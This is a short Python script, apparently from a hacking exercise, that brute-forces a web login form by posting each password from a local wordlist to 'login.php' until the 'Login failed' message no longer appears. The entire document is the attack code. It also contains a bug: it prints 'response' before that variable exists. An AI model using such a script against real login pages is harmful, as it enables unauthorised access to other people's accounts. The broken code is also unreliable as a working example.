import requests

target_url = 'login.php'
data_dict = {'username':'blahblah', 'password':'', 'Login':'submit'}
print(response.content)


with open('/root/Downloads/passwords.list','r') as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict['password'] = word
        response = requests.post(target_url, data=data_dict)
        if 'Login failed' not in str(response.content):
            print('[+] Got the password --> ' + word)
            exit()

            
print('[+] Reached end of password list.')
